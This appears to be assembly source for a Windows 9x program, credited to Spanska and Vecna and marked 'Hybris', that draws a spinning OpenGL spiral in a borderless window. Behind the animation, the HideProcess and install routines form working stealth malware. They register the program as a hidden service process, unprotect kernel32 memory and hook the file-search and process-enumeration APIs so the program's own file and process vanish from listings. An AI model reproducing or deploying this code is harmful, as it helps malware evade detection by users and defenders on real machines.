;spirale by spanska
;install and etc by vecna

callW  macro x
extrn x:PROC
       call x
endm

.386p
.model flat,STDCALL
locals @@

.data

ofs    equ offset
by     equ byte ptr
wo     equ word ptr
dwo    equ dword ptr

include pe.inc                          ;29A inc files
include mz.inc
include win32api.inc
;include process.inc

WS_POPUP equ 80000000h
WS_DISABLED equ 8000000h

IMPLANT EQU THIS BYTE

fff_entry:
       push dword ptr [esp+8]
       push dword ptr [esp+8]
       call swap_fff
       call _fff
       call swap_fff
       cmp eax, -1
       je @@error
       call check_name2
       jnz @@error
       push dword ptr [esp+8]
       push dword ptr [esp+8]
       call fnf_entry
  @@error:
       ret 2*4

fnf_entry:
  @@retry:
       push dword ptr [esp+8]
       push dword ptr [esp+8]
       call swap_fnf
       call _fnf
       call swap_fnf
       test eax, eax
       jz @@error
       call check_name2
       jz @@retry
  @@error:
       ret 2*4

p32f_entry:
       push dword ptr [esp+8]
       push dword ptr [esp+8]
       call swap_p32f
       call _p32f
       call swap_p32f
       test eax, eax
       jz @@error
       call check_name
       jnz @@error
       push dword ptr [esp+8]
       push dword ptr [esp+8]
       call p32n_entry
  @@error:
       ret 2*4

p32n_entry:
  @@retry:
       push dword ptr [esp+8]
       push dword ptr [esp+8]
       call swap_p32n
       call _p32n
       call swap_p32n
       test eax, eax
       jz @@error
       call check_name
       jz @@retry
  @@error:
       ret 2*4

_fff:
       db 0b8h
  fff  dd 0
       jmp eax

_fnf:
       db 0b8h
  fnf  dd 0
       jmp eax

_p32f:
       db 0b8h
  p32f dd 0
       jmp eax

_p32n:
       db 0b8h
  p32n dd 0
       jmp eax

check_name2:
       pushad
       mov esi, [esp+(8*4)+8+4]
       add esi, 44
       jmp slash

check_name:
       pushad
       mov esi, [esp+(8*4)+8+4]
       add esi, 36
  slash:
       mov ebx, esi
  @@nxt_char:
       lodsb
       cmp al, "\"
       je slash
  @@no_slash:
       test al, al
       jnz @@nxt_char
  @@cmp_name:
       cmp dword ptr [ebx], 12345678h
  name1 equ $-4
       jne @@isnot
       cmp dword ptr [ebx+4], 12345678h
  name2 equ $-4
  @@isnot:
       popad
       ret

delta:
       call @@tmpdelta
  @@tmpdelta:
       pop ebp
       sub ebp, ofs @@tmpdelta
       ret

swap_fff:
       pushad
       call delta
       lea esi, [ebp+fff_code]
       mov edi, [ebp+fff]
       jmp swap

swap_fnf:
       pushad
       call delta
       lea esi, [ebp+fnf_code]
       mov edi, [ebp+fnf]
       jmp swap

swap_p32f:
       pushad
       call delta
       lea esi, [ebp+p32f_code]
       mov edi, [ebp+p32f]
       jmp swap

swap_p32n:
       pushad
       call delta
       lea esi, [ebp+p32n_code]
       mov edi, [ebp+p32n]
  swap:
       push dword ptr [edi]
       push dword ptr [edi+4]
       push dword ptr [esi]
       push dword ptr [esi+4]
       pop dword ptr [edi+4]
       pop dword ptr [edi]
       pop dword ptr [esi+4]
       pop dword ptr [esi]
       popad
       ret

p32n_code:
p32f_code equ p32n_code+8
fff_code  equ p32n_code+16
fnf_code  equ p32n_code+24

IMPLANT_SIZE EQU $-ofs IMPLANT

RegisterService db 'RegisterServiceProcess', 0
kernel32        db 'KERNEL32', 0

paint_struct:
   pshdc               dd ?
   psfErase            dd 0
   psrcPaint           dd offset rect_struct
   psfRestore          dd ?
   psfIncUpdate        dd ?
   psrgbReserved       db 32 dup(?)

wndclassx:
   clscbSize         dd wndclassx_size
   clsStyle          dd 20h+2+1    ; class style CS_OWNDC+CS_VREDRAW+CS_HREDRAW
   clsLpfnWndProc    dd ?
   clsCbClsExtra     dd 0
   clsCbWndExtra     dd 0
   clsHInstance      dd ?          ; instance handle
   clsHIcon          dd 0          ; class icon handle
   clsHCursor        dd 0          ; class cursor handle
   clsHbrBackground  dd 7          ; class background brush
   clsLpszMenuName   dd 0          ; menu name
   clsLpszClassName  dd ?          ; far ptr to class name
   clshIconSm        dd 0
wndclassx_size equ $-offset wndclassx

DDPIXELFORMAT_struct:
   pfd_nSize                   dw 0
   pfd_nVersion                dw 0
   pfd_dwFlags                 dd 0
   pfd_iPixelType              db 0
   pfd_cColorBits              db 0
   pfd_cRedBits                db 0
   pfd_cRedShift               db 0
   pfd_cGreenBits              db 0
   pfd_cGreenShift             db 0
   pfd_cBlueBits               db 0
   pfd_cBlueShift              db 0
   pfd_cAlphaBits              db 0
   pfd_cAlphaShift             db 0
   pfd_cAccumBits              db 0
   pfd_cAccumRedBits           db 0
   pfd_cAccumGreenBits         db 0
   pfd_cAccumBlueBits          db 0
   pfd_cAccumAlphaBits         db 0
   pfd_cDepthBits              db 0
   pfd_cStencilBits            db 0
   pfd_cAuxBuffers             db 0
   pfd_iLayerType              db 0
   pfd_bReserved               db 0
   pfd_dwLayerMask             dd 0
   pfd_dwVisibleMask           dd 0
   pfd_dwDamageMask            dd 0
DDPIXELFORMAT_struct_size equ $-offset DDPIXELFORMAT_struct

nom_fenetre     db "Spirale",0
screenX         dd 100
screenY         dd 100
compteur        dd 110

float           TYPEDEF         REAL4

angle1          float 0.0
angle2          float 0.5
angle3          float 3.1415926535
angle4          float 3.6415926535
angle_inc       float 0.2
zoom            float 0.01
zoom_reset      float 0.01
zoom_inc        float 0.01
angle_anim      float 0.0
y1              float 0.0
x1              float 0.0
y2              float 0.0
x2              float 0.0
yy1             float 0.0
xx1             float 0.0
yy2             float 0.0
xx2             float 0.0
yyy1            float 0.0
xxx1            float 0.0
yyy2            float 0.0
xxx2            float 0.0
yyyy1           float 0.0
xxxx1           float 0.0
yyyy2           float 0.0
xxxx2           float 0.0

;collection de floats fixes

p0_05 float  0.05
p0_1 float   0.1
m0_1 float  -0.1
p0_2 float   0.2
m0_2 float  -0.2
p0_3 float   0.3
m0_3 float  -0.3
p0_4 float   0.4
m0_4 float  -0.4
p0_5 float   0.5
m0_5 float  -0.5
p0_6 float   0.6
m0_6 float  -0.6
m0_8 float  -0.8
p0_8 float   0.8
p1_0 float   1.0
m1_0 float  -1.0
p1_3 float   1.333333333
m1_5 float  -1.5
p1_5 float   1.5
p1_6 float   1.6
p1_7 float   1.7
p1_8 float   1.8
p1_85 float  1.85
p1_9 float   1.9
p2_0 float   2.0
m2_0 float  -2.0
m2_5 float  -2.5
m3_0 float  -3.0
m3_5 float  -3.5
p3_0 float   3.0
m4_0 float  -4.0
p4_0 float   4.0
m5_0 float  -5.0
p5_0 float   5.0
m6_0 float  -6.0
m8_0 float  -8.0
p10  float  10.0
m10  float -10.0
m40  float -40.0
p40  float  40.0
p45  float  45.0
m45  float -45.0
m60  float -60.0
m70  float -70.0
p90  float  90.0
m90  float -90.0

____color_spiral_R      float 1.0
____color_spiral_G      float 0.0
____color_spiral_B      float 0.0
____color_backgr_R      float 1.0
____color_backgr_G      float 1.0
____color_backgr_B      float 0.0
____angle_anim_inc      float 0.2

       db "Hybris (c) Vecna",10,13
       db "if i can see so far, is becoz i am in the shoulder of giants...",13,10
       db "Greetz goes to Z0MBiE, Spanska and Mister Sandman",13,10,0

dll    db "kernel32.dll", 0
api001 db "Process32First", 0
api002 db "Process32Next", 0
api003 db "FindFirstFileA", 0
api004 db "FindNextFileA", 0

dll1   db "opengl.dll", 0
dll2   db "opengl32.dll", 0
api00  db "wglCreateContext", 0
api01  db "glVertex2f", 0
api02  db "glEnd", 0
api03  db "glColor3f", 0
api04  db "glClearColor", 0
api05  db "glClear", 0
api06  db "glBegin", 0
api07  db "wglMakeCurrent", 0
api08  db "wglDeleteContext", 0

wglCreateContext dd ofs api00
glVertex2f       dd ofs api01
glEnd            dd ofs api02
glColor3f        dd ofs api03
glClearColor     dd ofs api04
glClear          dd ofs api05
glBegin          dd ofs api06
wglMakeCurrent   dd ofs api07
wglDeleteContext dd ofs api08
                 dd 0

vxdcall0        dd ?

handle          dd ?
handle_wd       dd ?
theDC           dd ?
pixformat       dd ?
theRC           dd ?

rect_struct:
   rcLeft          dd ?
   rcTop           dd ?
   rcRight         dd ?
   rcBottom        dd ?

msg:
   msHWND          dd ?
   msMESSAGE       dd ?
   msWPARAM        dd ?
   msLPARAM        dd ?
   msTIME          dd ?
   msPT            dd ?



.code

start:
       push 3
       callW SetErrorMode

       push ofs dll1
       callW LoadLibraryA
       mov ebx, eax
       test eax, eax
       jnz @@founddll
       push ofs dll2
       callW LoadLibraryA
       mov ebx, eax
       test eax, eax
       jnz @@founddll
;       push 0                           ;
;       push ofs nom_fenetre             ;
;       call @@tmp                       ;
;       db "No OpenGL support found!", 0 ;
;  @@tmp:                                ;
;       push 0                           ;
;       callW MessageBoxA                ;
       callW ExitProcess

  @@founddll:
       mov esi, ofs wglCreateContext
       mov edi, esi
  @@get_opengl:
       lodsd
       test eax, eax
       jz @@allloaded
       push eax
       push ebx
       callW GetProcAddress
       stosd
       jmp @@get_opengl
  @@allloaded:

       call HideProcess

;------------------------- get screen size, center hypno -----------------

       mov ____color_spiral_R, 3f800000h
       mov ____color_spiral_G, 3f800000h
       mov ____color_spiral_B, 3f800000h
       mov ____color_backgr_R, 0
       mov ____color_backgr_G, 0
       mov ____color_backgr_B, 0
       push 0                  ;SM_CXSCREEN
       callW GetSystemMetrics
       sub eax, 600
       shr eax, 1
       mov screenX, eax
       push 1                  ;SM_CYSCREEN
       callW GetSystemMetrics
       sub eax, 600
       shr eax, 1
       mov screenY, eax

;----------------- enregistrer la wndclass ----------------------------

       push 0
       callW GetModuleHandleA
       mov handle, eax
       mov clsHInstance, eax
       mov eax, offset wndproc
       mov clsLpfnWndProc, eax
       mov clsLpszClassName, offset nom_fenetre
       push offset wndclassx
       callW RegisterClassExA

;--------------------- creer la fenetre --------------------------------

       push 0
       push handle
       push 0
       push 0                          ;HWND_DESKTOP
       push 600                        ;hauteur
       push 600                        ;largeur
       push screenY                    ;y
       push screenX                    ;x
       ;push 0CF0000h+4000000h+2000000h        ;WS_OVERLAPPEDWINDOW+WS_CLIPSIBLINGS+WS_CLIPCHILDREN
       push WS_DISABLED+WS_POPUP
       push offset nom_fenetre
       push offset nom_fenetre
       push 8                          ;ws_ex_topmost
       callW CreateWindowExA
       mov handle_wd, eax

;---------- definir le masque en forme d'ellipse -------------------

       push 590                ;y lower-right
       push 590                ;x lower-right
       push 30                 ;y upper-left
       push 10                 ;x upper-left
       callW CreateEllipticRgn ;return region handle
       push 1                  ;window redraw flag 1=true
       push eax                ;handle to region
       push handle_wd
       callW SetWindowRgn

;------------------------ montre la fenetre ------------------------------

       push 1
       push handle_wd
       callW ShowWindow
       push handle_wd
       callW UpdateWindow
       call enable_opengl

;------------------------ le message loop ----------------------------------

winmain_msg_loop:
       push 0
       push 0
       push handle_wd
       callW InvalidateRect            ;force paint?
       push 1
       push 0
       push 0
       push 0
       push offset msg
       callW PeekMessageA
       cmp eax, 0
       jnz process_messages
       jmp winmain_msg_loop

;----- pour voir si la fenetre est fermée

process_messages:
       cmp msMESSAGE, 12h      ;WM_QUIT equ 0012h
       je end_loop
       push offset msg
       callW TranslateMessage
       push offset msg
       callW DispatchMessageA
       jmp winmain_msg_loop
end_loop:
       call disable_opengl
       push msWPARAM
       callW ExitProcess

;------------------ procédure de fenêtre vide pour accélérer ------------------------

wndproc proc hwnd:DWORD, wmsg:DWORD, wparam:DWORD, lparam:DWORD
       cmp wmsg, 1                     ;WM_CREATE?
       jne suite2
       xor eax, eax
       jmp wndproc_end
suite2:
       cmp wmsg, 84h                   ;WM_NCHITEST (mouse click)
       jne suite3
       mov eax, 2                      ;HTCAPTION
       jmp wndproc_end
suite3:
       cmp wmsg, 0fh                   ;WM_PAINT?
       jne suite5
       push offset rect_struct
       push handle_wd
       callW GetClientRect
       mov eax, theDC
       mov pshdc, eax
       push offset paint_struct
       push handle_wd
       callW BeginPaint
       call draw_opengl
       mov eax, theDC
       mov pshdc, eax
       push offset paint_struct
       push handle_wd
       callW EndPaint
       xor eax, eax
       jmp wndproc_end
fin_test_clavier:
       xor eax, eax
       jmp wndproc_end
suite5:
       push lparam
       push wparam
       push wmsg
       push hwnd
       callW DefWindowProcA
wndproc_end:
       ret
wndproc endp

;--------------------- enable OpenGL for window -----------------------------------

enable_opengl:
       push handle_wd
       callW GetDC
       mov theDC, eax
       mov pfd_nSize, DDPIXELFORMAT_struct_size
       mov pfd_nVersion, 1
       mov pfd_dwFlags, 20h+1+4        ;PFD_SUPPORT_OPENGL OR PFD_DOUBLEBUFFER OR PFD_DRAW_TO_WINDOW
       mov pfd_dwLayerMask, 0          ;PFD_MAIN_PLANE
       mov pfd_iPixelType, 0           ;PFD_TYPE_RGBA
       mov pfd_cColorBits, 24
       mov pfd_cDepthBits, 16
       mov pfd_cAccumBits, 0
       mov pfd_cStencilBits, 0
       push offset DDPIXELFORMAT_struct
       push theDC
       callW ChoosePixelFormat
       mov pixformat, eax
       push offset DDPIXELFORMAT_struct
       push pixformat
       push theDC
       callW SetPixelFormat    ;ne marche que si on importe aussi des api de opengl32????
                               ;des qu'on l'utilise, td32 devient fou
       push theDC
       call [wglCreateContext]
       mov theRC, eax
       push theRC
       push theDC
       call [wglMakeCurrent]
       ret

;--------------------- calculate, draw, eat cpu time... ----------------------

draw_opengl:
       ;---- clear background
       push 0          ;alpha
       push ____color_backgr_B         ;B
       push ____color_backgr_G ;G
       push ____color_backgr_R ;R
       call [glClearColor]
       push 4000h              ;GL_COLOR_BUFFER_BIT
       call [glClear]
       ;---- draw spirals
       mov ecx, compteur
draw_two_spirals:
       push ecx
       ;--- calculate coordinates of next point of the spiral 1
       fld angle1              ;x
       fcos
       fld zoom
       fmul
       fstp x2
       fld angle1              ;y
       fsin
       fld zoom
       fmul
       fstp y2
       ;--- calculate coordinates of next point of the spiral 2
       fld angle2              ;x
       fcos
       fld zoom
       fmul
       fstp xx2
       fld angle2              ;y
       fsin
       fld zoom
       fmul
       fstp yy2
       ;--- calculate coordinates of next point of the spiral 1
       fld angle3              ;x
       fcos
       fld zoom
       fmul
       fstp xxx2
       fld angle3              ;y
       fsin
       fld zoom
       fmul
       fstp yyy2
       ;--- calculate coordinates of next point of the spiral 2
       fld angle4              ;x
       fcos
       fld zoom
       fmul
       fstp xxxx2
       fld angle4              ;y
       fsin
       fld zoom
       fmul
       fstp yyyy2
       ;--- inc angle et epaisseur
       fld angle1
       fadd angle_inc
       fstp angle1
       fld angle2
       fadd angle_inc
       fstp angle2
       fld angle3
       fadd angle_inc
       fstp angle3
       fld angle4
       fadd angle_inc
       fstp angle4
vvv:
       fld zoom
       fadd zoom_inc
       fstp zoom
       push 7                  ;GL_QUADS
       call [glBegin]
       ;spiral 1
       push ____color_spiral_B
       push ____color_spiral_G
       push ____color_spiral_R
       call [glColor3f]
       push y1
       push x1
       call [glVertex2f]
       push y2
       push x2
       call [glVertex2f]
       ;spiral 2
       push yy1
       push xx1
       call [glVertex2f]
       push yy2
       push xx2
       call [glVertex2f]
       ;spiral 3
       ;push p1_0
       ;push 0
       ;push 0
       ;call [glColor3f]
       push yyy1
       push xxx1
       call [glVertex2f]
       push yyy2
       push xxx2
       call [glVertex2f]
       ;spiral 4
       push yyyy1
       push xxxx1
       call [glVertex2f]
       push yyyy2
       push xxxx2
       call [glVertex2f]
       call [glEnd]
       ;--- point p becomes point p-1 (spiral 1)
       mov eax, x2
       mov x1, eax
       mov eax, y2
       mov y1, eax
       ;--- point p becomes point p-1 (spiral 2)
       mov eax, xx2
       mov xx1, eax
       mov eax, yy2
       mov yy1, eax
       ;--- point p becomes point p-1 (spiral 3)
       mov eax, xxx2
       mov xxx1, eax
       mov eax, yyy2
       mov yyy1, eax
       ;--- point p becomes point p-1 (spiral 2)
       mov eax, xxxx2
       mov xxxx1, eax
       mov eax, yyyy2
       mov yyyy1, eax
       ;--- dec compteur
       pop ecx
       dec ecx
       jnz draw_two_spirals
       push theDC
       callW SwapBuffers
       ;--- reset the parameters for next spirals
       sub eax, eax
       mov x1, eax             ;first point back to center
       mov y1, eax
       mov xx1, eax            ;first point back to center
       mov yy1, eax
       mov xxx1, eax           ;first point back to center
       mov yyy1, eax
       mov xxxx1, eax          ;first point back to center
       mov yyyy1, eax
       fld angle_anim          ;rotate next spiral a bit
       fadd ____angle_anim_inc
       fstp angle_anim
       mov eax, angle_anim     ;initialize the new starting angle
       mov angle1, eax
       fld p0_5                ;idem for spiral 2 but with 180 degrees (pi radians) shift
       fadd angle_anim
       fstp angle2
       fldpi                   ;idem for spiral 2 but with 180 degrees (pi radians) shift
       fadd angle_anim
       fstp angle3
       fldpi                   ;idem for spiral 2 but with 180 degrees (pi radians) shift
       fadd p0_5
       fadd angle_anim
       fstp angle4
       mov eax, zoom_reset     ;reset the zoom level
       mov zoom, eax
       ret

;--------------------- disable OpenGL ----------------------

disable_opengl:
       push 0
       push 0
       call [wglMakeCurrent]
       push theRC
       call [wglDeleteContext]
       push theDC
       push handle_wd
       callW ReleaseDC
       ret

HideProcess:
       push ofs kernel32
       call GetModuleHandleA
       test eax, eax
       jz @@error
       push ofs RegisterService
       push eax
       callW GetProcAddress
       test eax, eax
       jz @@error
       push 1
       push 0
       call eax                                ;modo correto e documentado :)
  @@error:
       call @@seh
       mov esp, [esp+8]
       jmp @@fault
  @@seh:
       push dwo fs:[0]
       mov dwo fs:[0], esp                     ;modo incorreto(so por via das
       push -10h                               ;duvidas)
       pop eax
       add eax, fs:[eax+28h]                   ;pega TIB
       mov eax, dwo fs:[eax+8]
       or dwo fs:[eax+20h], 180h                  ;nukeprocess+serviceprocess
  @@fault:
       call install
       pop dwo fs:[0]
       pop eax
  exitx:
       ret

exitx2:
       add esp, 128
       jmp exitx

install:
       sub ebp, ebp
       sub esp, 104h*2
       mov ebx, esp
       push 104h
       push ebx
       push 0
       callW GetModuleFileNameA
       mov ecx, [ebx+eax-8-4]
       mov dwo [name1], ecx
       mov ecx, [ebx+eax-4-4]
       mov dwo [name2], ecx
       add esp, 104h*2

       push ofs dll
       callW GetModuleHandleA
       mov edi, eax
       mov ebx, eax
       add edi, [edi+3ch]

       mov esi, [edi+78h]
       mov esi, [esi+eax+1ch]
       mov ecx, [esi+eax]
       add ecx, eax
       mov [vxdcall0], ecx

       push ofs api004
       push eax
       push ofs api003
       push eax
       push ofs api002
       push eax
       push ofs api001
       push eax
       callW GetProcAddress
       mov [p32f], eax
       callW GetProcAddress
       mov [p32n], eax
       callW GetProcAddress
       mov [fff], eax
       callW GetProcAddress
       mov [fnf], eax

       push edi
       call deprotect

       movzx ecx, wo [edi+6]
       lea esi, [edi+0f8h]
       mov edx, IMPLANT_SIZE+32
  @@section_loop:
       mov eax, [esi+36]
       and eax, 0C0000040h
       cmp eax, 0C0000040h
       jne @@next_section
       mov eax, [esi+16]
       mov edi, [esi+8]
       sub eax, edi
       cmp eax, edx
       jb @@next_section
       add [esi+8], edx
       add edi, [esi+12]
       add edi, ebx
       jmp @@copy_code
  @@next_section:
       add esi, 40
       loop @@section_loop
       jmp @@jmpexit2win

  @@copy_code:
       lea ecx, [edx-32]
       mov edx, edi
       mov esi, ofs fff_entry
       cld
       push edi
       call deprotect
       rep movsb
       mov edi, [fff]
       lea esi, [edx+(fff_code-fff_entry)]
       call patch
       mov edi, [fnf]
       lea esi, [edx+(fnf_code-fff_entry)]
       call patch
       add dwo [edi-4], (fnf_entry-fff_entry)
       mov edi, [p32f]
       lea esi, [edx+(p32f_code-fff_entry)]
       call patch
       add dwo [edi-4], (p32f_entry-fff_entry)
       mov edi, [p32n]
       lea esi, [edx+(p32n_code-fff_entry)]
       call patch
       add dwo [edi-4], (p32n_entry-fff_entry)
  @@jmpexit2win:
       ret

patch:
       push edi
       xchg esi, edi
       movsd
       movsd
       mov edi, [esp]
       call deprotect
       mov al, 0e9h
       stosb
       stosd
       mov eax, edx
       sub eax, edi
       mov [edi-4], eax
       ret

deprotect:
       pushad
       mov eax, [esp+(8*4)+4]
       shr eax, 12
       push 020060000h
       push ebp
       push 1
       push eax
       push 00001000dh
       call dwo [vxdcall0]
       popad
       ret 4

end    start
